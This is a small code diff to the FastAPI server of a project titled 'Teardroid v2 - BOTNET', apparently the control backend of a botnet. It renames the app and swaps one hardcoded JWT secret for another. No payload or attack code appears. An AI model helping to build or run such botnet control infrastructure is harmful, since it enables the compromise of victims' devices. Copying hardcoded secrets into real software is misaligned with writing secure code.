@@ -14,8 +14,8 @@ from routers.auth import auth
 
 app = FastAPI(
     version="4.0",
-    title="Teardroid v2 - BOTNET",
-    description="Teardroid v2 - BOTNET",
+    title="2 - BOTNET",
+    description="2 - BOTNET",
     redoc_url=None,
 )
 
@@ -37,7 +37,7 @@ app.add_middleware(
 
 
 class Settings(BaseModel):
-    authjwt_secret_key: str = "jaihind"
+    authjwt_secret_key: str = "jaiTF"
 
 
 # callback to get your configuration
